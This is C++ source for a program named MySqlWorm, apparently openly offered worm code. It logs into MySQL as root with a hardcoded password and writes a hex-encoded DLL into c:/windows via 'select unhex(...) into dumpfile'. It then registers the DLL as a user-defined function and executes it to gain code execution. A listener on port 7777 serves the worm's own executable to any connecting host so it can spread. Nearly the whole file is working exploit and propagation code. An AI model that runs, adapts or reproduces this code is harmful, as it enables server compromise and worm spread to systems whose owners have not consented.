// MySqlWorm.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <WINDOWS.H>
#include <winsock.h>
#include <tchar.h>
#include <io.h>
#include <time.h>
#include "mysql.h"
#include "hex_code.h"

#pragma comment(lib,"libmysql.lib")
#pragma comment(lib,"ws2_32.lib")

MYSQL mysql;
void wait()
{
	MSG msg;
	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

BOOL doQuery(char *result,char *query)
{
	MYSQL_RES *res;
	MYSQL_ROW row;
	unsigned int i;

	if (mysql_real_query(&mysql,query,(unsigned int)strlen(query)) != 0)
	{
		fprintf(stderr,"Query Failed,Error: %s\n",mysql_error(&mysql));
		return FALSE;
	}

	if (res = mysql_store_result(&mysql))
	{
		while (row = mysql_fetch_row(res))
		{
			for (i = 0;i < mysql_num_fields(res);i++)
			{
				printf("%s ",row[i]);
			}
			printf("\n");
		}
		mysql_free_result(res);
	}
	else if (mysql_errno(&mysql))
	{
		fprintf(stderr,"Get result,Error: %s\n",mysql_error(&mysql));
		return FALSE;
	}
	else printf("Query Success.\n");


	return TRUE;
}

void gen_random(char *s, const int len) 
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	int i;
	srand((unsigned)time(0));

	for (i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

#define QUERY_LENGTH (102400)
void MySqlExploit(char *host,char *root,char *pwd)
{
	char *query = (char *)malloc(QUERY_LENGTH);
	char name[10] = {0};
	ZeroMemory(query,QUERY_LENGTH);
	gen_random(name,8);
	__try
	{
		char result[1024] = {0};
		unsigned long version;

		if (!mysql_real_connect(&mysql,
								"127.0.0.1",		// host
								"root",				// user
								"cc",				// password
								NULL,				// db name, NULL = default
								0,					// port, 0 = default
								NULL,				// unix_socket, use socket or pipe if not NULL
								0))					// normally 0	
		{
			fprintf(stderr,"Failed to connect to database: Error: %s\n",mysql_error(&mysql));
			__leave;
		}

		version = mysql_get_server_version(&mysql);
		if (version)
		{
			int major_version = version / 10000;
			int minor_version = (version % 10000) / 100;
			if (major_version >= 5 && minor_version >= 1)
			{
				fprintf(stderr,"MySql Version is too high, not support!");
				__leave;
			}
		}

		printf("Uploading udf dll file...\n");
		sprintf_s(query,QUERY_LENGTH,"select unhex('%s') into dumpfile 'c:/windows/%s.dll'",hex_code,name);
		if (!doQuery(result,query))
			__leave;

		printf("Select database 'mysql'...\n");
		if (!doQuery(result,"use mysql"))
			__leave;

		printf("Creating udf function...\n");
		sprintf_s(query,QUERY_LENGTH,"create function myfunc_test returns integer soname '%s.dll'",name);
		if (!doQuery(result,query))
			__leave;

		printf("Run udf function...\n");
		sprintf_s(query,QUERY_LENGTH,"select myfunc_test('%s')",name);
		if (!doQuery(result,query))
			printf("Run udf function failed...!\n");

		printf("drop udf function...\n");
		if (!doQuery(result,"drop function myfunc_test"))
			__leave;
	}
	__finally
	{
		free(query);
	}
}

SOCKET m_socket;
void runServer()
{
	SOCKADDR_IN addrClient;
	char filename[MAX_PATH] = {0};
	int len = sizeof(SOCKADDR);
	char *Buffer = (char *)malloc(QUERY_LENGTH);
	DWORD dwNumberOfBytesRead;
	HANDLE hFile;
	unsigned long long file_size = 0;
	ZeroMemory(Buffer,QUERY_LENGTH);
	GetModuleFileNameA(NULL,filename,MAX_PATH);

	while (TRUE)
	{
		SOCKET sockConn = accept(m_socket,(SOCKADDR *)&addrClient,&len);
		hFile = CreateFileA(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			break;
		file_size = GetFileSize(hFile,NULL);

		send(sockConn,(char *)&file_size,sizeof(unsigned long long)+1,0);

		do 
		{
			ReadFile(hFile,Buffer,sizeof(Buffer),&dwNumberOfBytesRead,NULL);
			send(sockConn,Buffer,dwNumberOfBytesRead,0);
		} while (dwNumberOfBytesRead);

		CloseHandle(hFile);
	}

}

BOOL InitSocket()
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	SOCKADDR_IN addrSrv;
	wVersionRequested = MAKEWORD(1,1);
	err = WSAStartup(wVersionRequested,&wsaData);
	if (err != 0)
		return FALSE;
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return FALSE;
	}

	m_socket = socket(AF_INET,SOCK_STREAM,0);
	if (m_socket == INVALID_SOCKET)
	{
		printf("Create socket failed.\n");
		return FALSE;
	}
	
	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(7777);

	err = bind(m_socket,(SOCKADDR *)&addrSrv,sizeof(SOCKADDR));
	if (err == SOCKET_ERROR)
	{
		closesocket(m_socket);
		printf("Bind socket failed.\n");
		return FALSE;
	}

	listen(m_socket,5);
	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{	
	HANDLE hMutex;
	char szHostName[128] = {0};
	SetLastError(ERROR_SUCCESS);
	hMutex = CreateMutexA(NULL,FALSE,"MWormRaz");
	if (hMutex == NULL)
	{			
		return -1;
	}

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	InitSocket();
	if (gethostname(szHostName,sizeof(szHostName)))
	{
		printf("gethostname error:%d",WSAGetLastError());
		return 0;
	}

	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)runServer,NULL,0,NULL);
	mysql_init(&mysql);


	do 
	{
		MySqlExploit("127.0.0.1","root","cc");
		break;
	} while (TRUE);

	mysql_close(&mysql);
	mysql_library_end();
	
	wait();
	CloseHandle(hMutex);
	return 0;
}

